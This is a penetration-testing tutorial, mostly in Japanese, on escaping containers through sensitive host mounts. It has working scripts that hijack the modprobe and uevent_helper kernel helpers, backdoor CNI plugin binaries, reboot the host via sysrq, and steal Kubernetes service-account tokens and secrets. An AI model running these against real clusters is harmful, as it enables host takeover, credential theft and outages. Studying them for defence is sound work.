# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## 概要

Host mounts は、最も重要な実用的 container-escape 面の1つです。なぜなら、慎重に隔離された process の view を host resources への直接的な可視性へとしばしば崩してしまうからです。危険なケースは `/` に限りません。`/proc`、`/sys`、`/var`、runtime sockets、kubelet-managed state、device 関連パスの bind mounts は、kernel controls、credentials、隣接する container filesystem、runtime management interfaces を露出させる可能性があります。

このページが個別の protection pages とは別に存在するのは、abuse model が横断的だからです。書き込み可能な host mount が危険なのは、mount namespaces のためでもあり、user namespaces のためでもあり、AppArmor や SELinux の coverage のためでもあり、そして実際にどの host path が exposed されたかのためでもあります。これを独立した topic として扱うことで、attack surface をはるかに理解しやすくなります。

## `/proc` Exposure

procfs には、通常の process 情報と、高影響な kernel control interfaces の両方が含まれます。したがって、`-v /proc:/host/proc` のような bind mount や、予期しない writable な proc entries を exposed する container view は、information disclosure、denial of service、または host への直接的な code execution につながる可能性があります。

高価値な procfs paths には以下が含まれます:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

まず、どの高価値な procfs entries が visible か、または writable かを確認します:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
これらのパスは、理由がそれぞれ異なるため興味深いです。`core_pattern`、`modprobe`、`binfmt_misc` は、書き込み可能な場合に host の code-execution path になり得ます。`kallsyms`、`kmsg`、`kcore`、`config.gz` は、kernel exploitation のための強力な reconnaissance source です。`sched_debug` と `mountinfo` は process、cgroup、filesystem のコンテキストを明らかにし、container 内から host のレイアウトを再構築するのに役立ちます。

各パスの実用的な価値はそれぞれ異なり、すべてを同じ影響度として扱うと triage が難しくなります:

- `/proc/sys/kernel/core_pattern`
書き込み可能であれば、これは最も影響の大きい procfs パスの1つです。kernel は crash 後に pipe handler を実行するためです。container が `core_pattern` を overlay 上、または mounted host path 上の payload に向けられるなら、しばしば host code execution を得られます。専用の例として [read-only-paths.md](protections/read-only-paths.md) も参照してください。
- `/proc/sys/kernel/modprobe`
この path は、module-loading logic を呼び出す必要があるときに kernel が使用する userspace helper を制御します。container から書き込み可能で、host context で解釈される場合、別の host code execution primitive になり得ます。helper path を trigger する方法と組み合わせると、特に興味深いです。
- `/proc/sys/vm/panic_on_oom`
通常、これはきれいな escape primitive ではありませんが、OOM condition を kernel panic behavior に変えることで、memory pressure を host 全体の denial of service に تبدیلできます。
- `/proc/sys/fs/binfmt_misc`
registration interface が書き込み可能であれば、攻撃者は任意の magic value 用の handler を登録し、一致する file が実行されたときに host-context execution を得られる可能性があります。
- `/proc/config.gz`
kernel exploit triage に有用です。host package metadata を必要とせずに、どの subsystem、mitigation、任意の kernel feature が有効かを判断するのに役立ちます。
- `/proc/sysrq-trigger`
主に denial-of-service path ですが、非常に深刻です。host を即座に reboot、panic、またはその他の方法で妨害できます。
- `/proc/kmsg`
kernel ring buffer messages を公開します。host fingerprinting、crash analysis、そして一部の環境では kernel exploitation に役立つ情報の leak に有用です。
- `/proc/kallsyms`
読み取り可能であれば価値があります。exported kernel symbol information を公開し、kernel exploit development 中の address randomization assumptions を破るのに役立つことがあります。
- `/proc/[pid]/mem`
これは直接的な process-memory interface です。対象 process に必要な ptrace-style condition で到達できる場合、他の process の memory を read または modify できる可能性があります。現実的な影響は credentials、`hidepid`、Yama、ptrace restrictions に大きく依存するため、強力ですが条件付きの path です。
- `/proc/kcore`
system memory の core-image-style view を公開します。file は非常に大きく扱いにくいですが、意味のある形で readable であれば、host memory surface がひどく露出していることを示します。
- `/proc/kmem` and `/proc/mem`
歴史的に影響の大きい raw memory interface です。多くの modern system では無効化されているか強く制限されていますが、存在し利用可能であれば重大な findings として扱うべきです。
- `/proc/sched_debug`
scheduling と task information を漏らし、他の process view が予想よりきれいに見える場合でも host process identities を露出する可能性があります。
- `/proc/[pid]/mountinfo`
container が host 上のどこで本当に動いているのか、どの path が overlay-backed か、そして writable mount が host content に対応するのか、それとも container layer のみに対応するのかを再構築するのに非常に有用です。

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
これらのコマンドは、container内のパスをhostから見た対応するパスに変換する必要がある host-execution の手法がいくつかあるため有用です。

### Full Example: `modprobe` Helper Path Abuse

もし `/proc/sys/kernel/modprobe` が container から書き込み可能で、かつ helper path が host context で解釈されるなら、attacker-controlled な payload にリダイレクトできます:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
正確なトリガーはターゲットとkernelの挙動に依存しますが、重要なのは、書き込み可能なhelper pathによって、将来のkernel helperの実行を攻撃者が制御するhost-pathコンテンツへリダイレクトできる点です。

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

目的が即時のescapeではなく、exploitability assessment である場合:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
これらのコマンドは、有用なシンボル情報が見えているか、最近の kernel メッセージに興味深い状態が示されているか、どの kernel 機能や mitigation が組み込まれているかを確認するのに役立ちます。影響は通常、直接的な escape ではありませんが、kernel-vulnerability のトリアージを大幅に短縮できます。

### Full Example: SysRq Host Reboot

If `/proc/sysrq-trigger` is writable and reaches the host view:
```bash
echo b > /proc/sysrq-trigger
```
その結果は即時のホスト再起動です。これはさりげない例ではありませんが、procfs exposure が information disclosure よりはるかに深刻になり得ることを明確に示しています。

## `/sys` Exposure

sysfs は大量の kernel と device の状態を公開します。sysfs のパスの中には主に fingerprinting に役立つものもあれば、helper execution、device behavior、security-module configuration、または firmware state に影響を与えるものもあります。

高価値な sysfs パスには以下があります:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

これらのパスが重要なのは理由が異なるためです。`/sys/class/thermal` は thermal-management の挙動に影響を与え、露出が不適切な環境ではホストの安定性に関わります。`/sys/kernel/vmcoreinfo` は crash-dump と kernel-layout の情報を leak し、低レベルのホスト fingerprinting に役立つことがあります。`/sys/kernel/security` は Linux Security Modules が使う `securityfs` インターフェースなので、ここへの予期しないアクセスは MAC 関連の状態を露出または変更する可能性があります。EFI variable のパスは firmware-backed の boot 設定に影響を与える可能性があり、通常の設定ファイルよりはるかに深刻です。`/sys/kernel/debug` 配下の `debugfs` は特に危険です。なぜなら、これは意図的に developer 向けのインターフェースであり、hardening された production 向け kernel APIs より安全性への前提がかなり少ないからです。

これらのパスを確認するのに役立つコマンドは次のとおりです:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
これらのコマンドが興味深い理由:

- `/sys/kernel/security` は、AppArmor、SELinux、または別の LSM の surface が、本来は host-only のままであるべき形で見えているかどうかを示すことがある。
- `/sys/kernel/debug` は、このグループの中で最も警戒すべき finding であることが多い。`debugfs` が mount されていて readable または writable なら、広い kernel-facing surface を想定すべきで、その正確な risk は有効化されている debug node に依存する。
- EFI variable の露出はそれほど一般的ではないが、存在する場合は影響が大きい。なぜなら、通常の runtime files ではなく firmware-backed settings に触れるからである。
- `/sys/class/thermal` は主に host の stability と hardware interaction に関係し、きれいな shell-style escape にはあまり関係しない。
- `/sys/kernel/vmcoreinfo` は主に host fingerprinting と crash-analysis の source であり、低レベルの kernel state を理解するのに役立つ。

### Full Example: `uevent_helper`

`/sys/kernel/uevent_helper` が writable なら、`uevent` が trigger されたときに kernel は attacker-controlled helper を実行する可能性がある:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
そのため、helper path は host の視点から解釈される。トリガーされると、helper は現在の container 内ではなく host context で実行される。

## `/var` Exposure

host の `/var` を container に mount するのは、`/` を mount するほど派手には見えないため、しばしば過小評価される。実際には、runtime sockets、container snapshot directories、kubelet-managed pod volumes、projected service-account tokens、隣接する application filesystems に到達するのに十分な場合がある。現代の node では、`/var` は実際には最も operationally interesting な container state が存在する場所であることが多い。

### Kubernetes Example

`hostPath: /var` を持つ pod は、他の pods の projected tokens や overlay snapshot content をしばしば読み取れる:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
これらのコマンドが有用なのは、その mount が単なる地味なアプリケーションデータのみを公開しているのか、それとも影響の大きい cluster credentials を公開しているのかを判断できるからです。読み取り可能な service-account token があれば、local code execution をただちに Kubernetes API access に変えられる場合があります。

token が存在する場合は、token の発見で止めずに、その token が何に到達できるかを確認してください:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
ここでの影響はローカルノードアクセスよりはるかに大きい可能性があります。広いRBACを持つ token は、マウントされた `/var` を cluster-wide compromise に変えられます。

### Docker And containerd Example

Docker hosts では関連データは `/var/lib/docker` 配下にあることが多く、containerd-backed の Kubernetes nodes では `/var/lib/containerd` や snapshotter-specific paths にある場合があります:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
もしマウントされた `/var` が別の workload の書き込み可能な snapshot 内容を露出している場合、攻撃者は現在の container 設定に触れずに、アプリケーションファイルを改ざんしたり、web コンテンツを設置したり、起動スクリプトを変更したりできる可能性があります。

書き込み可能な snapshot 内容が見つかった場合の具体的な abuse アイデア:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
これらのコマンドは、マウントされた `/var` の3つの主な影響範囲、つまり application tampering、secret recovery、そして隣接する workloads への lateral movement を示すので有用です。

## Kubelet State, Plugins, And CNI Paths

`/var/lib/kubelet`、`/opt/cni/bin`、または `/etc/cni/net.d` のマウントは、privileged DaemonSets、CNI agents、CSI node plugins、GPU operators、storage helpers を通じて公開されることがよくあります。これらのマウントは「node plumbing」として軽視されがちですが、新しい pods の実行経路に直接位置しており、kubelet credentials、projected secrets、registration sockets、そして実行可能な host-side plugin binaries を含むことが多いです。

高価値な対象には以下があります:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

有用な確認コマンドは次のとおりです:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Why these paths matter:

- `/var/lib/kubelet/pki` may expose kubelet client certificates and other node-local credentials that can sometimes be reused against the API server or kubelet-facing TLS endpoints, depending on cluster design.
- `/var/lib/kubelet/pods` often contains projected service-account tokens and mounted Secrets for neighboring pods on the same node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` is mainly a reconnaissance surface, but a very useful one: it reveals which pods and containers currently own GPUs, hugepages, SR-IOV devices, and other scarce node-local resources.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, and `/var/lib/kubelet/plugins_registry` reveal which CSI, DRA, and device plugins are installed and which sockets the kubelet is expected to talk to. If those directories are writable rather than merely readable, the finding becomes much more serious.
- `/opt/cni/bin` and `/etc/cni/net.d` sit directly on the pod-network setup path. Writable access there is often a delayed host-execution primitive rather than just configuration exposure.

### Full Example: Writable `/opt/cni/bin`

If a host CNI binary directory is mounted read-write, replacing a plugin can be enough to obtain host execution the next time the kubelet creates a pod sandbox on that node:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
これはマウントされた `docker.sock` ほど即時ではありませんが、侵害された Kubernetes の infrastructure pods では、こちらのほうがより現実的なことがよくあります。重要なのは、改変されたバイナリが後で host network のセットアップフローによって実行されるのであって、現在の container によって実行されるのではない、という点です。


## Runtime Sockets

Sensitive host mounts には、完全なディレクトリではなく runtime sockets が含まれることがよくあります。これらは非常に重要なので、ここで明示的に繰り返しておく価値があります:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
[socket](runtime-api-and-daemon-exposure.md) がマウントされたら、完全な exploitation フローについては [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) を参照してください。

手早い最初の対話パターンとして:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
これらのいずれかが成功すると、"mounted socket" から "start a more privileged sibling container" への経路は、通常、どの kernel breakout path よりもはるかに短くなります。

## Mount-Related CVEs

Host mounts は runtime の脆弱性とも交差します。重要な最近の例には以下があります:

- `CVE-2024-21626` in `runc` では、漏れたディレクトリ file descriptor により working directory を host filesystem 上に置ける可能性がありました。
- `CVE-2024-23651`、`CVE-2024-23652`、および `CVE-2024-23653` in BuildKit では、悪意ある Dockerfiles、frontends、`RUN --mount` の流れによって、build 中に host file access、deletion、または elevated privileges が再導入される可能性がありました。
- `CVE-2024-1753` in Buildah と Podman build flows では、build 中に細工された bind mounts により `/` を read-write で露出できる可能性がありました。
- `CVE-2025-47290` in `containerd` 2.1.0 では、image unpack 中の TOCTOU により、特別に細工された image が pull 中に host filesystem を変更できる可能性がありました。

これらの CVEs がここで重要なのは、mount handling が operator configuration だけの問題ではないことを示しているからです。runtime 自体も mount-driven escape conditions を導入する可能性があります。

## Checks

次のコマンドを使って、最も価値の高い mount exposures を素早く特定します:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
ここで重要なのは:

- Host root、`/proc`、`/sys`、`/var`、および runtime sockets は、すべて高優先度の発見事項です。
- 書き込み可能な proc/sys エントリは、しばしば、その mount が安全な container view ではなく host-global な kernel controls を公開していることを意味します。
- mount された `/var` パスは、filesystem review だけでなく、credentials と隣接 workload の review も必要です。
- Kubelet state directories と CNI/plugin paths は、runtime sockets と同じ優先度にすべきです。なぜなら、それらはしばしば node の pod-creation と credential-distribution path に直接存在するからです。

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
